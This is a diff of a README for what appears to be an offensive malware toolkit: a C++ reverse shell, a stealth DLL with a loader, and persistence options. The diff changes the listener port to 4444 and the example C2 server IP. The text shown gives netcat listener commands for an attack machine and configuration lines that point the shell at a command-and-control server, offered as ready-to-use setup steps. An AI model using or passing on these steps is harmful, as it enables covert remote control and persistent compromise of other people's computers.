@@ -7,17 +7,17 @@ The fastest way to test the reverse shell:
 ### 1. Start Listener
 ```bash
 # On your attack machine (Kali/Linux)
-nc -lvnp 44895
+nc -lvnp 4444
 
 # Or on Windows with netcat
-nc.exe -lvnp 44895
+nc.exe -lvnp 4444
 ```
 
 ### 2. Configure & Execute
 ```cpp
 // In Reverse-Shell.cpp, line ~15
 std::string ip = "YOUR_IP_HERE";    // Replace with your machine IP
-int port = 44895;                   // Your chosen port
+int port = 4444;                   // Your chosen port
 ```
 
 ### 3. Compile & Run
@@ -77,8 +77,8 @@ Ninja-DLL-Loader.exe Ninja-Stealth-DLL.dll
 ### Network Settings
 ```cpp
 // Modify these values in the source code
-std::string ip = "192.168.1.100";    // Your C2 server IP
-int port = 44895;                    // Your C2 port
+std::string ip = "192.168.0.1";    // Your C2 server IP
+int port = 4444;                    // Your C2 port
 ```
 
 ### Persistence Options
